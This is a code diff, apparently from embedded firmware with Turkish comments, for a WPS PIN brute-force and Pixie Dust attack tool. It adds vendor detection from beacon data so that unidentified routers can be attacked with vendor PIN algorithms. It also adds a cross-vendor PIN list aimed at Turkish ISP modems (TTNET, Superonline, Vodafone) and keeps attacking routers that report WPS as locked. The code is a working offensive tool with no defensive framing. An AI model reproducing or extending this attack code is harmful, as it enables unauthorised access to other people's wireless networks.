@@ -1227,6 +1227,150 @@ static wps_vendor_t detect_vendor(const uint8_t *bssid) {
   return VENDOR_UNKNOWN;
 }
 
+// ─── Beacon IE üretici/model string → vendor tespiti ─────────────────────────
+// OUI tablosunda eşleşme olmadığında WPS beacon IE'den gelen manufacturer,
+// model_name, model_number ve device_name alanlarına bakılır.
+static wps_vendor_t detect_vendor_from_ie(const wps_device_info_t &info) {
+  if (!info.valid) return VENDOR_UNKNOWN;
+
+  struct { const char *kw; wps_vendor_t v; } MAP[] = {
+    {"ZTE",         VENDOR_ZTE},
+    {"ZXHN",        VENDOR_ZTE},
+    {"ZXDSL",       VENDOR_ZTE},
+    {"Huawei",      VENDOR_HUAWEI},
+    {"HUAWEI",      VENDOR_HUAWEI},
+    {"HiLink",      VENDOR_HUAWEI},
+    {"Sagemcom",    VENDOR_SAGEMCOM},
+    {"SAGEMCOM",    VENDOR_SAGEMCOM},
+    {"F@st",        VENDOR_SAGEMCOM},
+    {"Fast",        VENDOR_SAGEMCOM},
+    {"Arcadyan",    VENDOR_ARCADYAN},
+    {"arcadyan",    VENDOR_ARCADYAN},
+    {"Askey",       VENDOR_ARCADYAN},
+    {"ASKey",       VENDOR_ARCADYAN},
+    {"Zyxel",       VENDOR_ZYXEL},
+    {"ZyXEL",       VENDOR_ZYXEL},
+    {"ZYXEL",       VENDOR_ZYXEL},
+    {"TP-Link",     VENDOR_TPLINK},
+    {"TP-LINK",     VENDOR_TPLINK},
+    {"TPLink",      VENDOR_TPLINK},
+    {"D-Link",      VENDOR_DLINK},
+    {"D-LINK",      VENDOR_DLINK},
+    {"DLink",       VENDOR_DLINK},
+    {"NETGEAR",     VENDOR_NETGEAR},
+    {"Netgear",     VENDOR_NETGEAR},
+    {"ASUS",        VENDOR_ASUS},
+    {"ASUSTek",     VENDOR_ASUS},
+    {"Linksys",     VENDOR_LINKSYS},
+    {"LINKSYS",     VENDOR_LINKSYS},
+    {"Belkin",      VENDOR_BELKIN},
+    {"BELKIN",      VENDOR_BELKIN},
+    {"Tenda",       VENDOR_TENDA},
+    {"TENDA",       VENDOR_TENDA},
+    {"Mercusys",    VENDOR_MERCUSYS},
+    {"MERCUSYS",    VENDOR_MERCUSYS},
+    {"Totolink",    VENDOR_TOTOLINK},
+    {"TOTOLINK",    VENDOR_TOTOLINK},
+    {"Technicolor", VENDOR_TECHNICOLOR},
+    {"Thomson",     VENDOR_TECHNICOLOR},
+    {"THOMSON",     VENDOR_TECHNICOLOR},
+    {"AVM",         VENDOR_FRITZ},
+    {"Fritz",       VENDOR_FRITZ},
+    {"FRITZ",       VENDOR_FRITZ},
+    {"Arris",       VENDOR_ARRIS},
+    {"ARRIS",       VENDOR_ARRIS},
+    {"Motorola",    VENDOR_ARRIS},
+    {"Xiaomi",      VENDOR_XIAOMI},
+    {"XIAOMI",      VENDOR_XIAOMI},
+    {"Buffalo",     VENDOR_BUFFALO},
+    {"BUFFALO",     VENDOR_BUFFALO},
+    {"MikroTik",    VENDOR_MIKROTIK},
+    {"MIKROTIK",    VENDOR_MIKROTIK},
+    {"Compal",      VENDOR_COMPAL},
+    {"COMPAL",      VENDOR_COMPAL},
+    {"Sercomm",     VENDOR_SERCOMM},
+    {"SERCOMM",     VENDOR_SERCOMM},
+    {"Netis",       VENDOR_NETIS},
+    {"NETIS",       VENDOR_NETIS},
+    {"Wavlink",     VENDOR_NETIS},
+    {"Cisco",       VENDOR_CISCO},
+    {"CISCO",       VENDOR_CISCO},
+    {"Sagem",       VENDOR_SAGEM},
+    {"SAGEM",       VENDOR_SAGEM},
+    {"Comtrend",    VENDOR_COMTREND},
+    {"COMTREND",    VENDOR_COMTREND},
+    {"Actiontec",   VENDOR_ACTIONTEC},
+    {"ACTIONTEC",   VENDOR_ACTIONTEC},
+    {"Gemtek",      VENDOR_GEMTEK},
+    {"GEMTEK",      VENDOR_GEMTEK},
+    {"Iskratel",    VENDOR_ISKRATEL},
+    {"DrayTek",     VENDOR_DRAYTEK},
+    {"Draytek",     VENDOR_DRAYTEK},
+    {"Billion",     VENDOR_BILLION},
+    {"BILLION",     VENDOR_BILLION},
+    {"NetComm",     VENDOR_NETCOMM},
+    {"NETCOMM",     VENDOR_NETCOMM},
+    {"Ubiquiti",    VENDOR_UBIQUITI},
+    {"UBIQUITI",    VENDOR_UBIQUITI},
+    {"Ubnt",        VENDOR_UBIQUITI},
+    {nullptr,       VENDOR_UNKNOWN}
+  };
+
+  const char *fields[] = {
+    info.manufacturer, info.model_name, info.model_number,
+    info.device_name,  nullptr
+  };
+
+  for (int fi = 0; fields[fi]; fi++) {
+    if (!fields[fi][0]) continue;
+    for (int i = 0; MAP[i].kw; i++) {
+      if (strstr(fields[fi], MAP[i].kw)) return MAP[i].v;
+    }
+  }
+  return VENDOR_UNKNOWN;
+}
+
+// ─── Vendor adını global wps_vendor_name'e yaz ────────────────────────────────
+static void apply_vendor_name(wps_vendor_t v) {
+  switch (v) {
+    case VENDOR_ZTE:         strncpy(wps_vendor_name, "ZTE",           31); break;
+    case VENDOR_HUAWEI:      strncpy(wps_vendor_name, "Huawei",        31); break;
+    case VENDOR_ZYXEL:       strncpy(wps_vendor_name, "Zyxel",         31); break;
+    case VENDOR_TPLINK:      strncpy(wps_vendor_name, "TP-Link",       31); break;
+    case VENDOR_SAGEMCOM:    strncpy(wps_vendor_name, "Sagemcom",      31); break;
+    case VENDOR_ARCADYAN:    strncpy(wps_vendor_name, "Arcadyan",      31); break;
+    case VENDOR_DLINK:       strncpy(wps_vendor_name, "D-Link",        31); break;
+    case VENDOR_NETGEAR:     strncpy(wps_vendor_name, "Netgear",       31); break;
+    case VENDOR_ASUS:        strncpy(wps_vendor_name, "ASUS",          31); break;
+    case VENDOR_LINKSYS:     strncpy(wps_vendor_name, "Linksys",       31); break;
+    case VENDOR_BELKIN:      strncpy(wps_vendor_name, "Belkin",        31); break;
+    case VENDOR_TENDA:       strncpy(wps_vendor_name, "Tenda",         31); break;
+    case VENDOR_MERCUSYS:    strncpy(wps_vendor_name, "Mercusys",      31); break;
+    case VENDOR_TECHNICOLOR: strncpy(wps_vendor_name, "Technicolor",   31); break;
+    case VENDOR_FRITZ:       strncpy(wps_vendor_name, "AVM Fritz!Box", 31); break;
+    case VENDOR_ARRIS:       strncpy(wps_vendor_name, "Arris/Motorola",31); break;
+    case VENDOR_XIAOMI:      strncpy(wps_vendor_name, "Xiaomi",        31); break;
+    case VENDOR_BUFFALO:     strncpy(wps_vendor_name, "Buffalo",       31); break;
+    case VENDOR_MIKROTIK:    strncpy(wps_vendor_name, "MikroTik",      31); break;
+    case VENDOR_COMPAL:      strncpy(wps_vendor_name, "Compal",        31); break;
+    case VENDOR_SERCOMM:     strncpy(wps_vendor_name, "Sercomm",       31); break;
+    case VENDOR_NETIS:       strncpy(wps_vendor_name, "Netis/Wavlink", 31); break;
+    case VENDOR_CISCO:       strncpy(wps_vendor_name, "Cisco",         31); break;
+    case VENDOR_SAGEM:       strncpy(wps_vendor_name, "Sagem",         31); break;
+    case VENDOR_COMTREND:    strncpy(wps_vendor_name, "Comtrend",      31); break;
+    case VENDOR_ACTIONTEC:   strncpy(wps_vendor_name, "Actiontec",     31); break;
+    case VENDOR_GEMTEK:      strncpy(wps_vendor_name, "Gemtek",        31); break;
+    case VENDOR_ISKRATEL:    strncpy(wps_vendor_name, "Iskratel",      31); break;
+    case VENDOR_TOTOLINK:    strncpy(wps_vendor_name, "Totolink",      31); break;
+    case VENDOR_DRAYTEK:     strncpy(wps_vendor_name, "DrayTek",       31); break;
+    case VENDOR_BILLION:     strncpy(wps_vendor_name, "Billion",       31); break;
+    case VENDOR_NETCOMM:     strncpy(wps_vendor_name, "NetComm",       31); break;
+    case VENDOR_UBIQUITI:    strncpy(wps_vendor_name, "Ubiquiti",      31); break;
+    default:                 strncpy(wps_vendor_name, "Bilinmeyen",    31); break;
+  }
+  wps_vendor_name[31] = '\0';
+}
+
 // ─── Açık seviyesi hesaplama ──────────────────────────────────────────────────
 // WPS PIN brute force + Pixie Dust araştırmalarına göre vendor başarı tahmini.
 // Tarama listesinde yıldız göstergesi için kullanılır.
@@ -2141,9 +2285,10 @@ int wps_ssid_to_pins(const char *ssid, const uint8_t *bssid,
 
 // ─── PIN listesi oluştur ──────────────────────────────────────────────────────
 // Vendor PIN'leri önce gelir (istatistiksel olarak daha başarılı)
-// VENDOR_UNKNOWN ise tüm 33 vendor algoritması baştan sona denenir.
+// VENDOR_UNKNOWN → tüm 33 vendor algoritması baştan sona denenir.
+// Bilinen vendor → kendi PIN'leri + 14 çapraz VULN_HIGH vendor PIN'leri.
+// En büyük senaryo: VENDOR_UNKNOWN → 33 × 10 = 330 vendor + 95 ortak + 30 serial/ssid
 #define MAX_VENDOR_PINS_PER_VENDOR  10
-// 33 vendor × 10 pin = 330 + 95 ortak + 20 ssid-bazlı + 8 buffer
 #define ALL_PINS_MAX  (33 * MAX_VENDOR_PINS_PER_VENDOR + COMMON_PIN_COUNT + 30)
 static char all_pins[ALL_PINS_MAX][9];
 static int  all_pin_count = 0;
@@ -2251,13 +2396,44 @@ static void build_pin_list(const uint8_t *bssid, wps_vendor_t vendor) {
 
   // ── 3. Vendor'a özgü hesaplanmış PIN'ler ─────────────────────────────────
   if (vendor == VENDOR_UNKNOWN) {
+    // Bilinmeyen vendor: tüm 33 vendor algoritmasını dene (Türkiye yaygınlık sırasıyla)
     for (int v = 0; v < ALL_VENDORS_COUNT; v++)
       add_vendor_pins(bssid, ALL_VENDORS[v]);
   } else {
+    // Tespit edilen vendor: önce kendi PIN'leri
     add_vendor_pins(bssid, vendor);
+
+    // ── 3b. Çapraz VULN_HIGH vendor PIN'leri ─────────────────────────────
+    // Birçok ISP modemi farklı OUI'ye sahip olsa da aynı chipset PIN
+    // algoritmasını kullanır (ZTE OEM / Sagemcom OEM / Huawei OEM yaygın).
+    // Tespit edilen vendor hangisi olursa olsun, yüksek açıklı ISP vendor
+    // PIN'leri de eklenir — duplicateler otomatik atlanır.
+    static const wps_vendor_t CROSS_VENDORS[] = {
+      // Türkiye ISP dağıtım modemleri — OEM olasılığı yüksek
+      VENDOR_ZTE,         // TTNET VDSL/Fiber chipset, seri-PIN yaygın
+      VENDOR_SAGEMCOM,    // TTNET Fiber F@st, MAC tabanlı PIN
+      VENDOR_HUAWEI,      // TTNET/Superonline ONT, mac24 tabanlı
+      VENDOR_ARCADYAN,    // Vodafone TR VGV OEM
+      VENDOR_ZYXEL,       // Superonline VMG, mac24 tabanlı
+      VENDOR_SERCOMM,     // Vodafone/Turkcell OEM
+      VENDOR_GEMTEK,      // TTNet/Turkcell OEM
+      VENDOR_TECHNICOLOR, // ISP dağıtımlı TG serisi
+      // Tüketici yüksek açık vendor'lar
+      VENDOR_DLINK,       // Pixie Dust açığı yüksek
+      VENDOR_NETGEAR,     // Pixie Dust — E-S1=E-S2=0
+      VENDOR_TOTOLINK,    // Realtek chipset, sabit PIN
+      VENDOR_COMTREND,    // Ralink Pixie Dust
+      VENDOR_BILLION,     // BiPAC sabit PIN
+      VENDOR_BUFFALO,     // WZR Pixie Dust
+    };
+    static const int CROSS_COUNT = (int)(sizeof(CROSS_VENDORS) / sizeof(CROSS_VENDORS[0]));
+    for (int i = 0; i < CROSS_COUNT; i++) {
+      if (CROSS_VENDORS[i] != vendor)
+        add_vendor_pins(bssid, CROSS_VENDORS[i]);
+    }
   }
 
-  // ── 3. Ortak/evrensel PIN'ler (duplikat kontrolüyle) ─────────────────────
+  // ── 4. Ortak/evrensel PIN'ler (duplikat kontrolüyle) ─────────────────────
   for (int i = 0; COMMON_PINS[i] && all_pin_count < ALL_PINS_MAX; i++) {
     bool dup = false;
     for (int j = 0; j < all_pin_count; j++) {
@@ -2304,43 +2480,8 @@ void wps_start_attack(int target_index) {
 
   wps_vendor_t vendor = wps_targets[target_index].vendor;
 
-  // Vendor adını belirle
-  switch (vendor) {
-    case VENDOR_ZTE:         strncpy(wps_vendor_name, "ZTE",          31); break;
-    case VENDOR_HUAWEI:      strncpy(wps_vendor_name, "Huawei",       31); break;
-    case VENDOR_ZYXEL:       strncpy(wps_vendor_name, "Zyxel",        31); break;
-    case VENDOR_TPLINK:      strncpy(wps_vendor_name, "TP-Link",      31); break;
-    case VENDOR_SAGEMCOM:    strncpy(wps_vendor_name, "Sagemcom",     31); break;
-    case VENDOR_ARCADYAN:    strncpy(wps_vendor_name, "Arcadyan",     31); break;
-    case VENDOR_DLINK:       strncpy(wps_vendor_name, "D-Link",       31); break;
-    case VENDOR_NETGEAR:     strncpy(wps_vendor_name, "Netgear",      31); break;
-    case VENDOR_ASUS:        strncpy(wps_vendor_name, "ASUS",         31); break;
-    case VENDOR_LINKSYS:     strncpy(wps_vendor_name, "Linksys",      31); break;
-    case VENDOR_BELKIN:      strncpy(wps_vendor_name, "Belkin",       31); break;
-    case VENDOR_TENDA:       strncpy(wps_vendor_name, "Tenda",        31); break;
-    case VENDOR_MERCUSYS:    strncpy(wps_vendor_name, "Mercusys",     31); break;
-    case VENDOR_TECHNICOLOR: strncpy(wps_vendor_name, "Technicolor",  31); break;
-    case VENDOR_FRITZ:       strncpy(wps_vendor_name, "AVM Fritz!Box",31); break;
-    case VENDOR_ARRIS:       strncpy(wps_vendor_name, "Arris/Motorola",31); break;
-    case VENDOR_XIAOMI:      strncpy(wps_vendor_name, "Xiaomi",       31); break;
-    case VENDOR_BUFFALO:     strncpy(wps_vendor_name, "Buffalo",      31); break;
-    case VENDOR_MIKROTIK:    strncpy(wps_vendor_name, "MikroTik",     31); break;
-    case VENDOR_COMPAL:      strncpy(wps_vendor_name, "Compal",       31); break;
-    case VENDOR_SERCOMM:     strncpy(wps_vendor_name, "Sercomm",      31); break;
-    case VENDOR_NETIS:       strncpy(wps_vendor_name, "Netis/Wavlink",31); break;
-    case VENDOR_CISCO:       strncpy(wps_vendor_name, "Cisco",        31); break;
-    case VENDOR_SAGEM:       strncpy(wps_vendor_name, "Sagem",        31); break;
-    case VENDOR_COMTREND:    strncpy(wps_vendor_name, "Comtrend",     31); break;
-    case VENDOR_ACTIONTEC:   strncpy(wps_vendor_name, "Actiontec",    31); break;
-    case VENDOR_GEMTEK:      strncpy(wps_vendor_name, "Gemtek",       31); break;
-    case VENDOR_ISKRATEL:    strncpy(wps_vendor_name, "Iskratel",     31); break;
-    case VENDOR_TOTOLINK:    strncpy(wps_vendor_name, "Totolink",     31); break;
-    case VENDOR_DRAYTEK:     strncpy(wps_vendor_name, "DrayTek",      31); break;
-    case VENDOR_BILLION:     strncpy(wps_vendor_name, "Billion",      31); break;
-    case VENDOR_NETCOMM:     strncpy(wps_vendor_name, "NetComm",      31); break;
-    case VENDOR_UBIQUITI:    strncpy(wps_vendor_name, "Ubiquiti",     31); break;
-    default:                 strncpy(wps_vendor_name, "Bilinmeyen",   31); break;
-  }
+  // Vendor adını ayarla (apply_vendor_name yardımcısını kullan)
+  apply_vendor_name(vendor);
 
   // ── Beacon IE yakalama: model/seri/Pixie Dust bilgisi al ─────────────────
   // Promiscuous modda beacon'ı dinle — aynı kanal, bağlantısız, 3 saniye.
@@ -2352,6 +2493,23 @@ void wps_start_attack(int target_index) {
   if (wps_device_info.valid && wps_device_info.ap_setup_locked) {
     DEBUG_PRINTLN("WPS: AP_SETUP_LOCKED=1 tespit edildi! WPS kilitli.");
     // Kilitli olsa da devam et — bazı firmware yanlış rapor eder
+  }
+
+  // ── IE tabanlı vendor iyileştirmesi ──────────────────────────────────────
+  // OUI tablosunda eşleşme yoksa (VENDOR_UNKNOWN) beacon IE'den gelen
+  // manufacturer/model string'ine bakarak vendor tespiti tekrar denenur.
+  // Böylece OUI veritabanında olmayan yeni cihazlar da doğru vendor
+  // algoritmalarıyla saldırıya uğratılabilir.
+  if (vendor == VENDOR_UNKNOWN && wps_device_info.valid) {
+    wps_vendor_t ie_v = detect_vendor_from_ie(wps_device_info);
+    if (ie_v != VENDOR_UNKNOWN) {
+      vendor = ie_v;
+      wps_targets[target_index].vendor = ie_v;
+      wps_targets[target_index].vuln   = assess_vuln(ie_v);
+      apply_vendor_name(ie_v);
+      DEBUG_PRINTF("WPS IE vendor tespiti: %s (OUI tablosunda yoktu)\n",
+                   wps_vendor_name);
+    }
   }
 
   build_pin_list(wps_targets[target_index].bssid, vendor);
